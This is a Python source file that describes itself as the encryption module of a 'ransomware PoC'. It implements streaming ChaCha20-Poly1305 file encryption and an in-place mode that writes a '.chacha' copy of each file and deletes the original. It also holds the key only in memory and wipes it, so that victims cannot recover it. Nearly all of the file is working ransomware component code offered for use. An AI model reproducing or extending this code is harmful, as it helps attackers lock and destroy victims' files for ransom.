#!/usr/bin/env python3
"""
ChaCha20-Poly1305 encryption module for ransomware PoC.
Uses authenticated encryption for better security than Fernet.
"""

import os
import struct
from typing import BinaryIO, Iterator, Optional, Union

from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.backends import default_backend


class ChaChaFileCipher:
    """
    File encryption using ChaCha20-Poly1305.
    Provides authenticated encryption with streaming support.
    """

    # Chunk size for streaming (1 MB)
    CHUNK_SIZE = 1024 * 1024

    def __init__(self, key: Optional[bytes] = None):
        """
        Initialize cipher with key.
        If key is None, generates a new 256-bit key.
        """
        if key is None:
            self.key = ChaChaFileCipher.generate_key()
        else:
            if len(key) != 32:
                raise ValueError("Key must be 32 bytes (256 bits)")
            self.key = key

        self.cipher = ChaCha20Poly1305(self.key)

    @staticmethod
    def generate_key() -> bytes:
        """Generate a random 256-bit key."""
        return os.urandom(32)

    def encrypt_chunk(self, plaintext: bytes, nonce: bytes) -> bytes:
        """Encrypt a single chunk with authentication tag."""
        return self.cipher.encrypt(nonce, plaintext, None)

    def decrypt_chunk(self, ciphertext: bytes, nonce: bytes) -> bytes:
        """Decrypt and verify a single chunk."""
        return self.cipher.decrypt(nonce, ciphertext, None)

    def encrypt_file_streaming(self, src_path: str, dst_path: str) -> None:
        """
        Encrypt file using streaming mode (memory efficient).
        Format: [nonce (12 bytes)][file size (8 bytes)][chunk1][chunk2]...
        Each chunk is [len (4 bytes)][encrypted data (variable)][tag (16 bytes)]
        """
        nonce = os.urandom(12)  # ChaCha20 uses 96-bit nonce

        with open(src_path, 'rb') as src_f:
            with open(dst_path, 'wb') as dst_f:
                # Write header: nonce + file size
                file_size = os.path.getsize(src_path)
                dst_f.write(nonce)
                dst_f.write(struct.pack('>Q', file_size))  # 8 bytes, big-endian

                chunk_counter = 0

                while True:
                    chunk = src_f.read(self.CHUNK_SIZE)
                    if not chunk:
                        break

                    # Generate unique nonce for each chunk
                    # Use nonce XOR chunk_counter for uniqueness
                    chunk_nonce = self._derive_chunk_nonce(nonce, chunk_counter)

                    # Encrypt chunk
                    encrypted = self.cipher.encrypt(chunk_nonce, chunk, None)

                    # Write: [length (4 bytes)][encrypted data]
                    dst_f.write(struct.pack('>I', len(encrypted)))
                    dst_f.write(encrypted)

                    chunk_counter += 1

    def decrypt_file_streaming(self, src_path: str, dst_path: str) -> None:
        """
        Decrypt file using streaming mode.
        """
        with open(src_path, 'rb') as src_f:
            with open(dst_path, 'wb') as dst_f:
                # Read header
                nonce = src_f.read(12)
                if len(nonce) != 12:
                    raise ValueError("Invalid encrypted file format")

                size_data = src_f.read(8)
                if len(size_data) != 8:
                    raise ValueError("Invalid encrypted file format")

                file_size = struct.unpack('>Q', size_data)[0]
                bytes_written = 0
                chunk_counter = 0

                while bytes_written < file_size:
                    # Read chunk length
                    len_data = src_f.read(4)
                    if not len_data:
                        break

                    chunk_len = struct.unpack('>I', len_data)[0]

                    # Read encrypted chunk
                    encrypted = src_f.read(chunk_len)
                    if len(encrypted) != chunk_len:
                        raise ValueError("Truncated encrypted file")

                    # Derive chunk nonce
                    chunk_nonce = self._derive_chunk_nonce(nonce, chunk_counter)

                    # Decrypt
                    decrypted = self.cipher.decrypt(chunk_nonce, encrypted, None)

                    # Write
                    dst_f.write(decrypted)
                    bytes_written += len(decrypted)
                    chunk_counter += 1

    def _derive_chunk_nonce(self, base_nonce: bytes, counter: int) -> bytes:
        """
        Derive unique nonce for each chunk from base nonce and counter.
        Uses XOR to combine them.
        """
        counter_bytes = struct.pack('>Q', counter)  # 8 bytes
        # Pad counter to 12 bytes and XOR with base nonce
        padded_counter = b'\x00' * 4 + counter_bytes
        return bytes([a ^ b for a, b in zip(base_nonce, padded_counter)])

    def encrypt_file_inplace(self, file_path: str, extension: str = ".chacha") -> str:
        """
        Encrypt file in-place, replacing original.
        Returns path to encrypted file.
        """
        temp_path = file_path + ".tmp"
        encrypted_path = file_path + extension

        # Encrypt to temp
        self.encrypt_file_streaming(file_path, temp_path)

        # Replace original
        os.replace(temp_path, encrypted_path)

        # Remove original if different
        if os.path.exists(file_path) and file_path != encrypted_path:
            os.remove(file_path)

        return encrypted_path

    def decrypt_file_inplace(self, file_path: str, extension: str = ".chacha") -> str:
        """
        Decrypt file in-place, restoring original.
        Returns path to decrypted file.
        """
        if not file_path.endswith(extension):
            raise ValueError(f"File does not have expected extension: {extension}")

        temp_path = file_path + ".tmp"
        decrypted_path = file_path[:-len(extension)]

        # Decrypt to temp
        self.decrypt_file_streaming(file_path, temp_path)

        # Replace
        os.replace(temp_path, decrypted_path)

        # Remove encrypted
        os.remove(file_path)

        return decrypted_path


class SecureMemoryBuffer:
    """
    Secure memory buffer that wipes key material on deletion.
    """

    def __init__(self, data: bytes):
        self._data = bytearray(data)
        self._length = len(data)

    def __del__(self):
        """Securely wipe memory when object is deleted."""
        self.wipe()

    def wipe(self):
        """Overwrite buffer with zeros."""
        for i in range(len(self._data)):
            self._data[i] = 0
        self._data = None

    def get(self) -> bytes:
        """Get copy of data."""
        return bytes(self._data)

    def __len__(self) -> int:
        return self._length


class InMemoryKey:
    """
    Key that stays in memory only, never written to disk.
    """

    def __init__(self, key: Optional[bytes] = None):
        if key is None:
            key = ChaChaFileCipher.generate_key()

        self._key_buffer = SecureMemoryBuffer(key)

    def get_cipher(self) -> ChaChaFileCipher:
        """Get cipher instance with this key."""
        return ChaChaFileCipher(self._key_buffer.get())

    def wipe(self):
        """Securely wipe key from memory."""
        self._key_buffer.wipe()

    def __del__(self):
        """Ensure key is wiped on garbage collection."""
        self.wipe()


# Convenience functions
def encrypt_file_chacha(file_path: str, key: bytes, extension: str = ".chacha") -> str:
    """
    Encrypt a file using ChaCha20-Poly1305.
    Returns path to encrypted file.
    """
    cipher = ChaChaFileCipher(key)
    return cipher.encrypt_file_inplace(file_path, extension)


def decrypt_file_chacha(file_path: str, key: bytes, extension: str = ".chacha") -> str:
    """
    Decrypt a file encrypted with ChaCha20-Poly1305.
    Returns path to decrypted file.
    """
    cipher = ChaChaFileCipher(key)
    return cipher.decrypt_file_inplace(file_path, extension)


if __name__ == "__main__":
    import tempfile

    print("ChaCha20-Poly1305 Encryption Test")
    print("=" * 60)

    # Create test file
    with tempfile.NamedTemporaryFile(mode='wb', delete=False) as f:
        test_data = b"This is a test file with some data. " * 10000
        f.write(test_data)
        test_path = f.name

    print(f"[*] Created test file: {test_path}")
    print(f"[*] Original size: {len(test_data)} bytes")

    # Generate key
    key = ChaChaFileCipher.generate_key()
    print(f"[*] Generated key: {key.hex()}")

    # Encrypt
    cipher = ChaChaFileCipher(key)
    encrypted_path = test_path + ".chacha"
    cipher.encrypt_file_streaming(test_path, encrypted_path)
    print(f"[*] Encrypted to: {encrypted_path}")
    print(f"[*] Encrypted size: {os.path.getsize(encrypted_path)} bytes")

    # Decrypt
    decrypted_path = test_path + ".dec"
    cipher.decrypt_file_streaming(encrypted_path, decrypted_path)
    print(f"[*] Decrypted to: {decrypted_path}")

    # Verify
    with open(decrypted_path, 'rb') as f:
        decrypted_data = f.read()

    if decrypted_data == test_data:
        print("[+] Decryption successful - data matches!")
    else:
        print("[!] Decryption failed - data mismatch!")

    # Cleanup
    os.remove(test_path)
    os.remove(encrypted_path)
    os.remove(decrypted_path)

    # Secure memory test
    print("\n[*] Testing secure memory buffer...")
    secret = b"SUPER_SECRET_KEY_12345678901234"
    buf = SecureMemoryBuffer(secret)
    print(f"[+] Buffer created with {len(buf)} bytes")
    buf.wipe()
    print("[+] Buffer wiped")

    print("\n[*] Test complete!")
